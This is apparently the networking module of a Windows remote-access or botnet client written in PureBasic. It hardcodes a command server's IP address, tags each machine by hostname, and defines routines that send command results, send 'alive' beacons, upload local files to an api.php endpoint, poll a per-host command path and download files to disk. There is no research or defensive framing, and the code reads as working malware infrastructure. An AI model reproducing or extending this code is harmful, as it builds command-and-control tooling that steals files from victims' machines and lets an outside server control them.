; initialize network stack
InitNetwork() 

; localhost id (need further testing)
Global hostname.s = Hostname()

; the following variables should be auto-generated in future versions
Global svr_protocol.s = "http://"
Global svr_address.s = "83.212.115.112" 
Global svr_path.s = "/" 

#INTERNET_FLAG_NO_CACHE_WRITE = $04000000
#INTERNET_FLAG_NO_COOKIES = $00080000
#INTERNET_FLAG_RELOAD = $80000000

Procedure.s POST_(path.s,dat.s)
	open_handle = InternetOpen_("HAMKO5",1,"","",0)
	connect_handle = InternetConnect_(open_handle,svr_address,80,"","",3,0,0)
	request_handle = HttpOpenRequest_(connect_handle,"POST",svr_path+path,"","",0, #INTERNET_FLAG_NO_CACHE_WRITE | #INTERNET_FLAG_NO_COOKIES | #INTERNET_FLAG_RELOAD ,0)
	;headers.s = "Connection: close" +Chr(13)+Chr(10)  
	;headers.s = "Keep-Alive: 600" + Chr(13) + Chr(10) 
	headers.s = "Content-Length: "+ Str(StringByteLength(dat, #PB_UTF8))+ Chr(13) + Chr(10) 
	headers.s + "Content-Type: application/x-www-form-urlencoded" +Chr(13)+Chr(10)  
	HttpAddRequestHeaders_(request_handle,headers,Len(headers), $80000000 | $20000000)

	*PostDataAnsi = AllocateMemory(StringByteLength(dat, #PB_UTF8)+1)
	PokeS(*PostDataAnsi, dat, -1, #PB_UTF8)
	
	send_handle = HttpSendRequest_(request_handle, "", 0,*PostDataAnsi  ,StringByteLength(dat, #PB_UTF8) )
	FreeMemory(*PostDataAnsi)
	
	buffer.s = Space(1024) 
	
    Repeat
        InternetReadFile_(request_handle,@buffer,1024,@bytes_read.l)
        result.s + PeekS(@buffer, -1, #PB_UTF8)
        buffer = Space(1024)
    Until bytes_read=0
    
  
	InternetCloseHandle_(open_handle)
	InternetCloseHandle_(connect_handle)
	InternetCloseHandle_(request_handle)
	InternetCloseHandle_(send_handle)

	ProcedureReturn result
EndProcedure

Procedure.s GET_(path.s)
	open_handle = InternetOpen_("HAMKO5",1,"","",0)
	connect_handle = InternetConnect_(open_handle,svr_address,80,"","",3,0,0)
	request_handle = HttpOpenRequest_(connect_handle,"GET",path,"","",0, #INTERNET_FLAG_NO_CACHE_WRITE | #INTERNET_FLAG_NO_COOKIES | #INTERNET_FLAG_RELOAD ,0)
	headers.s = "Connection: close" +Chr(13)+Chr(10)  
	;headers.s + "Content-Type: application/x-www-form-urlencoded" +Chr(13)+Chr(10)  
	HttpAddRequestHeaders_(request_handle,headers,Len(headers), $80000000 | $20000000)
	
	send_handle = HttpSendRequest_(request_handle, "", 0, "",0)  
  
	buffer.s = Space(1024) 
	
	Repeat
		InternetReadFile_(request_handle,@buffer,1024,@bytes_read.l)
		result.s + PeekS(@buffer, -1, #PB_UTF8)
		buffer = Space(1024)
	Until bytes_read=0

	InternetCloseHandle_(connect_handle)
	InternetCloseHandle_(request_handle)
	InternetCloseHandle_(send_handle)
	InternetCloseHandle_(open_handle)
  
	; Check if the returned string contains an server generated error
	; Since GET response should not contain html code, return an empty string instead
	If Left(result,6) = "<html>"  
		ProcedureReturn ""          
	EndIf 
  
	ProcedureReturn result
EndProcedure

Procedure GET_FILE(path.s,localpath.s)
	ProcedureReturn URLDownloadToFile_(0, path, localpath, 0, 0)
EndProcedure 


Procedure.s send_com(dat.s)
	ProcedureReturn POST_("api.php","action=cmd&host="+hostname+"&data="+dat)
EndProcedure

Procedure.s send_fdb(dat.s)
	 ProcedureReturn POST_("api.php","action=fdw&host="+hostname+"&data="+dat)
EndProcedure

Procedure.s send_alv(dat.s)
     ProcedureReturn  POST_("api.php","action=alv&host="+hostname+"&data="+dat)
EndProcedure

Procedure.s send_file(file.s,dat.s)
	ProcedureReturn  POST_("api.php","action=upl&host="+hostname+"&name="+GetFilePart(file)+"&data="+dat)
EndProcedure


Global compath.s = svr_path+"instances/"+hostname+"/com"
Global fdpath.s = svr_path+"instances/"+hostname+"/session"

; IDE Options = PureBasic 5.00 (Windows - x86)
; EnableXP
; EnableCompileCount = 12
; EnableBuildCount = 0